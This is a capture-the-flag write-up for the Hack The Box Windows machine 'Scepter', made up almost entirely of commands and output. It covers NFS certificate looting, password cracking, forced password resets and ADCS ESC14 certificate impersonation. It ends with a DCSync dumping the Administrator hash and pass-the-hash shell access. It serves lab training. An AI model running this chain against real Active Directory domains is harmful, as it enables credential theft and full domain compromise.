---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - DcSync
  - ESC-14
---
# Overview

| Name        | Scepter |
| ----------- | ------- |
| OS          | Windows |
| Base Points | Hard    |
| Status      | Done    |
# Recon
## Nmap 

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~]
└──╼ [★]$ sudo nmap -sC -sV 10.129.244.44 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-14 02:20 CST
Nmap scan report for 10.129.244.44
Host is up (0.24s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-14 16:20:55Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-14T16:21:59+00:00; +7h59m58s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.scepter.htb
| Not valid before: 2025-11-07T20:25:34
|_Not valid after:  2026-11-07T20:25:34
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.scepter.htb
| Not valid before: 2025-11-07T20:25:34
|_Not valid after:  2026-11-07T20:25:34
|_ssl-date: 2026-01-14T16:21:57+00:00; +7h59m59s from scanner time.
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.scepter.htb
| Not valid before: 2025-11-07T20:25:34
|_Not valid after:  2026-11-07T20:25:34
|_ssl-date: 2026-01-14T16:21:59+00:00; +7h59m58s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.scepter.htb
| Not valid before: 2025-11-07T20:25:34
|_Not valid after:  2026-11-07T20:25:34
|_ssl-date: 2026-01-14T16:21:57+00:00; +7h59m59s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
| smb2-time: 
|   date: 2026-01-14T16:21:48
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```
# Enumeration

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~]
└──╼ [★]$ showmount -e scepter.htb
Export list for scepter.htb:
/helpdesk (everyone)
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~]
└──╼ [★]$ sudo mkdir mountfiles  
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~]
└──╼ [★]$ sudo mount -t nfs scepter.htb:/helpdesk ./mountfiles  
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~]
└──╼ [★]$ sudo su
┌─[root@htb-ejsq0c8hxb]─[/home/at0mxploit]
└──╼ #cd mountfiles/
┌─[root@htb-ejsq0c8hxb]─[/home/at0mxploit/mountfiles]
└──╼ #ls
baker.crt  baker.key  clark.pfx  lewis.pfx  scott.pfx
```

```bash
┌─[root@htb-ejsq0c8hxb]─[/home/at0mxploit/mountfiles]
└──╼ #openssl pkcs12 -in clark.pfx -clcerts -nokeys
Enter Import Password:
Mac verify error: invalid password?
```

```bash
$ export dc=dc01.scepter.htb  
$ export dom=scepter.htb
```

```bash
$ mkdir Enum/NFS-Mount  
$ sudo mount -t nfs $dc:/helpdesk Enum/NFS-Mount/  
$ mkdir Enum/NFS-files  
$ sudo cp Enum/NFS-Mount/* Enum/NFS-files/  
$ sudo umount Enum/NFS-Mount  
$ cd NFS-files/  
$ ls -lah  
  
-rwx------ 1 root root 2.5K Aug 25 05:07 baker.crt  
-rwx------ 1 root root 2.0K Aug 25 05:07 baker.key  
-rwx------ 1 root root 3.3K Aug 25 05:07 clark.pfx  
-rwx------ 1 root root 3.3K Aug 25 05:07 lewis.pfx  
-rwx------ 1 root root 3.3K Aug 25 05:07 scott.pfx
```

```bash
$ sudo chown at0mxploit:at0mxploit *
  
-rwx------ 1 hush hush 2.5K Aug 25 05:07 baker.crt  
-rwx------ 1 hush hush 2.0K Aug 25 05:07 baker.key  
-rwx------ 1 hush hush 3.3K Aug 25 05:07 clark.pfx  
-rwx------ 1 hush hush 3.3K Aug 25 05:07 lewis.pfx  
-rwx------ 1 hush hush 3.3K Aug 25 05:07 scott.pfx  
# free to move.. no need for root now :)
```

Exploring `baker.crt` revealed full username of baker

```bash
$ openssl x509 -in baker.crt -text -noout  
  
<snip>  
Subject: DC=htb, DC=scepter, CN=Users, CN=d.baker, emailAddress=d.baker@scepter.htb  
<snip>
```

```bash
$ pfx2john clark.pfx > clark.hash  
$ john clark.hash  
$ john clark.hash --show
```

clark.pfx pass phrase: `newpassword`

First thing we try now is creating a pfx file for `d.baker` so we can use it to request a TGT from the KDC

```bash
$ openssl pkcs12 -export -out baker.pfx -inkey baker.key -in baker.crt -passin pass:newpassword -passout pass:  
$ ls  
  
baker.crt baker.key baker.pfx
```

Enumerating clark,lewis,scott pfx files also appeard to be using same password as baker → `newpassword`

```bash
$ for f in clark.pfx lewis.pfx scott.pfx; do echo -n "$f → "; openssl pkcs12 -info -in "$f" -nokeys -passin pass:newpassword 2>/dev/null | grep -m1 "subject=" | sed -E 's/.*CN=Users, CN=([^ ]+).*/\1/'; done  
  
clark.pfx → m.clark  
lewis.pfx → e.lewis  
scott.pfx → o.scott
```

- We can't use `clark.pfx, lewis.pfx, scott.pfx` to get a TGT because these accounts are disabled

```bash
certipy-ad auth -pfx clark.pfx -dc-ip $ip  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Certificate identities:  
[*]     SAN UPN: 'm.clark@scepter.htb'  
[*]     Security Extension SID: 'S-1-5-21-74879546-916818434-740295365-2103'  
[*] Using principal: 'm.clark@scepter.htb'  
[*] Trying to get TGT...  
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
[-] Use -debug to print a stacktrace  
[-] See the wiki for more information
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~/Enum/NFS-files]
└──╼ [★]$ certipy auth -pfx baker.pfx -dc-ip $ip
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: d.baker@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'd.baker.ccache'
[*] Trying to retrieve NT hash for 'd.baker'
[*] Got hash for 'd.baker@scepter.htb': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce

```

```bash
$ export KRB5CCNAME=d.baker.ccache
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~/Enum/NFS-files]
└──╼ [★]$ crackmapexec smb $dc -k --use-kcache --rid-brute 12000
SMB         dc01.scepter.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
SMB         dc01.scepter.htb 445    DC01             [+] scepter.htb\d.baker from ccache 
SMB         dc01.scepter.htb 445    DC01             498: SCEPTER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             500: SCEPTER\Administrator (SidTypeUser)
SMB         dc01.scepter.htb 445    DC01             501: SCEPTER\Guest (SidTypeUser)
SMB         dc01.scepter.htb 445    DC01             502: SCEPTER\krbtgt (SidTypeUser)
SMB         dc01.scepter.htb 445    DC01             512: SCEPTER\Domain Admins (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             513: SCEPTER\Domain Users (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             514: SCEPTER\Domain Guests (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             515: SCEPTER\Domain Computers (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             516: SCEPTER\Domain Controllers (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             517: SCEPTER\Cert Publishers (SidTypeAlias)
SMB         dc01.scepter.htb 445    DC01             518: SCEPTER\Schema Admins (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             519: SCEPTER\Enterprise Admins (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             520: SCEPTER\Group Policy Creator Owners (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             521: SCEPTER\Read-only Domain Controllers (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             522: SCEPTER\Cloneable Domain Controllers (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             525: SCEPTER\Protected Users (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             526: SCEPTER\Key Admins (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             527: SCEPTER\Enterprise Key Admins (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             553: SCEPTER\RAS and IAS Servers (SidTypeAlias)
SMB         dc01.scepter.htb 445    DC01             571: SCEPTER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         dc01.scepter.htb 445    DC01             572: SCEPTER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         dc01.scepter.htb 445    DC01             1000: SCEPTER\DC01$ (SidTypeUser)
SMB         dc01.scepter.htb 445    DC01             1101: SCEPTER\DnsAdmins (SidTypeAlias)
SMB         dc01.scepter.htb 445    DC01             1102: SCEPTER\DnsUpdateProxy (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             1103: SCEPTER\staff (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             1104: SCEPTER\IT Support (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             1105: SCEPTER\Helpdesk Admins (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             1106: SCEPTER\d.baker (SidTypeUser)
SMB         dc01.scepter.htb 445    DC01             1107: SCEPTER\a.carter (SidTypeUser)
SMB         dc01.scepter.htb 445    DC01             1108: SCEPTER\h.brown (SidTypeUser)
SMB         dc01.scepter.htb 445    DC01             1109: SCEPTER\p.adams (SidTypeUser)
SMB         dc01.scepter.htb 445    DC01             1111: SCEPTER\Replication Operators (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             1601: SCEPTER\CMS (SidTypeGroup)
SMB         dc01.scepter.htb 445    DC01             2101: SCEPTER\e.lewis (SidTypeUser)
SMB         dc01.scepter.htb 445    DC01             2102: SCEPTER\o.scott (SidTypeUser)
SMB         dc01.scepter.htb 445    DC01             2103: SCEPTER\M.clark (SidTypeUser)
```

```bash
$ cat temp.txt | grep SidTypeUser | cut -d "\\" -f 2 | cut -d " " -f 1 | tee usernames.txt  
  
d.baker  
a.carter  
h.brown  
p.adams  
e.lewis  
o.scott  
M.clark  
$ cat temp.txt | grep SidTypeGroup | cut -d "\\" -f 2 | cut -d " " -f 1 | tee groups.txt  
  
staff  
IT  
Helpdesk  
Replication  
CMS
```

Notice `Replication` group may refer to DCSync attack vector later.

```bash
$ bloodhound-python -u d.baker -k -no-pass -d $dom -c ALL -dc $dc -ns $ip --zip
```

![[1_V7aHKsX_RJaYIiA-q0LbpA.webp]]

- `d.baker` can change password of a.carter. Also he is a member of STAFF group
- a.carter is member of `IT SUPPORT` group, which has genericall rights on `STAFF ACCESS CERTIFICATE`.

which means `a.carter` can control `d.baker`(member of `STAFF` group)

![[1_RfGfgzHja-YtS5KkLAewZQ.webp]]

- Also note the name of `STAFF ACCESS CERTIFICATE` object, looks like certipy is coming up.

Change `a.carter` password

```bash
$ export tuser=a.carter  
$ bloodyAD --host $dc -d $dom -k set password $tuser 'Password123!'
```

Add GenericAll to `a.carter`

```bash
bloodyAD -d $dom -u a.carter -p 'Password123!' --host $dc --dc-ip $ip add genericAll "OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB" a.carter
```

Use Certipy to look for vulnerable templates

- No results using a.carter

```bash
$ certipy-ad find -u a.carter -p 'Password123!' -dc-ip $ip -ns $ip -vulnerable -enabled  
  
"Certificate Templates": "[!] Could not find any certificate templates"
```

But it works with `d.baker` creds

```bash
$ certipy-ad find -u d.baker -hashes '18b5fb0d99e7a475316213c15b6f22ce' -dc-ip $ip -ns $ip -vulnerable -enabled  
  
  
$ cat *.json  
==================================================  
<snip>  
"[!] Vulnerabilities": {  
"ESC9": "Template has no security extension."  
},  
"[*] Remarks": {  
"ESC9": "Other prerequisites may be required for this to be exploitable. See the wiki for more details."  
}  
==================================================
```
# Initial Foothold
## ESC14

But upon researching for exploitation prerequisites, `ESC9` won't be applicable in our case. But **ESC14 Scenario B** is!

> **Reference:** [https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9)

We need to check who has this attribute `altSecurityIdentities` set; because, this attribute holds mappings between AD accounts and X.509 certificates (or Kerberos mappings)  
so lets check who has this attribute set.

```bash
$ nxc ldap $dc -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce --query "(altSecurityIdentities=*)" " "  
  
LDAP 10.129.166.177 389 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:scepter.htb)  
LDAP 10.129.166.177 389 DC01 [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce  
LDAP 10.129.166.177 389 DC01 [+] Response for object: CN=h.brown,CN=Users,DC=scepter,DC=htb
```

We need to impersonate h.brown by changing `d.baker` email to `h.brown` email then request a certificate for him.

Exploitation steps:

1. Change `d.baker` email to `h.brown@scepter.htb`
2. Request a certificate using certipy for `h.brown`
3. finally, generate a TGT

> Note: we need to rerun previous command related to users operations because cleaner script resets everything. (That’s why some commands are repeated down there)

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~/Enum/NFS-files]
└──╼ [★]$ bloodyAD --host $dc -d $dom -k set password a.carter 'Password123!'
[+] Password changed successfully!
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~/Enum/NFS-files]
└──╼ [★]$ bloodyAD -d $dom -u a.carter -p 'Password123!' --host $dc --dc-ip $ip add genericAll "OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB" a.carter
[+] a.carter has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~/Enum/NFS-files]
└──╼ [★]$ bloodyAD --host $dc -d $dom -u a.carter -p 'Password123!' set object d.baker mail -v h.brown@scepter.htb
[+] d.baker's mail has been updated
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~/Enum/NFS-files]
└──╼ [★]$ certipy req   -k   -u d.baker@scepter.htb   -target dc01.scepter.htb   -template StaffAccessCertificate   -ca scepter-DC01-CA   -dc-ip $ip
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 13
[*] Got certificate without identification
[*] Certificate has no object SID
[*] Saved certificate and private key to 'd.baker.pfx'

```

Let’s check `d.baker.pfx` metadata to confirm impersonation of `h.brown`

```bash
$ openssl pkcs12 -info -in d.baker.pfx  
# we can find the used email is h.brown's email  
  
subject=CN=d.baker, emailAddress=h.brown@scepter.htb
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~/Enum/NFS-files]
└──╼ [★]$ certipy auth -dc-ip $ip -pfx d.baker.pfx -domain $dom -username=h.brown
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: h.brown@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'h.brown.ccache'
[*] Trying to retrieve NT hash for 'h.brown'
[*] Got hash for 'h.brown@scepter.htb': aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c

```

Generate krb5.conf using nxc and replace **/etc/krb5.conf** content with the new one.

```bash
nxc smb $ip$ -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce --generate-krb5-file krb5.conf
$ sudo mv krb5.conf /etc/krb5.conf
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~/Enum/NFS-files]
└──╼ [★]$ evil-winrm -i dc01.scepter.htb -r scepter.htb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\h.brown\Documents> type ../desktop/user.txt
d91e9c5b39e7ce3005d4eea902372cb0
```
# Privilege Escalation

![[1_FJ7YebXri1eN0s_FO68f8w.webp]]

Digging more into bloodhound, we find that `HELPDESK ENROLLMENT CERTIFICATE` object contains `p.adams`, which is our target.

After some enumeration, bloodyAD can help us find writable things for `h.brown`

```bash
$ bloodyAD --host $dc -d $dom -u h.brown -k get writable --detail  
  
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=scepter,DC=htb  
url: WRITE  
wWWHomePage: WRITE  
  
distinguishedName: CN=h.brown,CN=Users,DC=scepter,DC=htb  
thumbnailPhoto: WRITE  
<snip>  
l: WRITE  
c: WRITE  
  
distinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb  
altSecurityIdentities: WRITE
```

We cee `h.brown` has **WRITE rights** on `altSecurityIdentities` attribute of `p.adams`.  
So we are going to repeat the attack we did before, **ESC14** but this time it’s **Scenario A**. Which means there's an additional step we are going to do, and it's setting value of **altSecurityIdentities** for `p.adams` using `h.brown`.

First let's see what format is used for X509 email

```bash
$ bloodyAD --host $dc -d $dom -u a.carter -k get object 'h.brown'  
  
distinguishedName: CN=h.brown,CN=Users,DC=scepter,DC=htb  
accountExpires: 1601-01-01 00:00:00+00:00  
altSecurityIdentities: X509:<RFC822>h.brown@scepter.htb  
badPasswordTime: 1601-01-01 00:00:00+00:00  
badPwdCount: 0  
<snip>
```

This is the format used `X509:<RFC822>h.brown@scepter.htb`.  
Now we need to write `altSecurityIdentities` value of `p.adams` to whatever we want, the main idea here is the make the attacker's and victim's email match, so the value doesn't matter as long as it matches.

![[1_czTuk8ZgEBwfWTFB_Z-prQ.webp]]
### Commands in action

Check altSecurityIdentities of `p.adams` using nxc

```bash
$ nxc ldap $dc -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce --query "(altSecurityIdentities=*)" " "  
  
LDAP 10.129.166.177 389 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:scepter.htb)  
LDAP 10.129.166.177 389 DC01 [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce  
LDAP 10.129.166.177 389 DC01 [+] Response for object: CN=h.brown,CN=Users,DC=scepter,DC=htb
```

Only `h.brown` has altSecurityIdentities set.. for now. Let's do it for `p.adams`

**Change a.carter password**

```bash
$ export KRB5CCNAME=d.baker.ccache  
$ bloodyAD --host $dc -d $dom -k set password a.carter 'Password123!'  
[+] Password changed successfully!
```

**Add genericAll to a.carter**

```bash
$ bloodyAD -d $dom -u a.carter -p 'Password123!' --host $dc --dc-ip $ip add genericAll "OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB" a.carter  
[+] a.carter has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB
```

**Spoof d.baker mail**

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~/Enum/NFS-files]
└──╼ [★]$ bloodyAD --host $dc -d $dom -u a.carter -p 'Password123!' set object d.baker mail -v hush0x01@scepter.htb
[+] d.baker's mail has been updated
```

**Write p.adams altSecurityIdentities to match d.baker's mail**

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~/Enum/NFS-files]
└──╼ [★]$ export KRB5CCNAME=h.brown.ccache
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~/Enum/NFS-files]
└──╼ [★]$ bloodyAD --host $dc -d $dom -u h.brown -k set object p.adams altSecurityIdentities -v 'X509:<RFC822>hush0x01@scepter.htb'
[+] p.adams's altSecurityIdentities has been updated
```

**Request certificate from KDC**

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~/Enum/NFS-files]
└──╼ [★]$ certipy req -u 'd.baker@scepter.htb' -hashes 18b5fb0d99e7a475316213c15b6f22ce -target $dc -template StaffAccessCertificate -ca scepter-DC01-CA -dc-ip $ip
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 15
[*] Got certificate without identification
[*] Certificate has no object SID
[*] Saved certificate and private key to 'd.baker.pfx'
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~/Enum/NFS-files]
└──╼ [★]$ certipy auth -dc-ip $ip -pfx d.baker.pfx -domain $dom -username=p.adams
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: p.adams@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'p.adams.ccache'
[*] Trying to retrieve NT hash for 'p.adams'
[*] Got hash for 'p.adams@scepter.htb': aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0
```

**Last step, DCSync**

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~/Enum/NFS-files]
└──╼ [★]$ export KRB5CCNAME=p.adams.ccache
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~/Enum/NFS-files]
└──╼ [★]$ impacket-secretsdump -k -no-pass $dc -target-ip $ip
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-ejsq0c8hxb]─[~/Enum/NFS-files]
└──╼ [★]$ evil-winrm -i dc01.scepter.htb -u Administrator -H a291ead3493f9773dc615e66c2ea21c4
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
8aac569992a576f67a0628eec0092dfc
```

---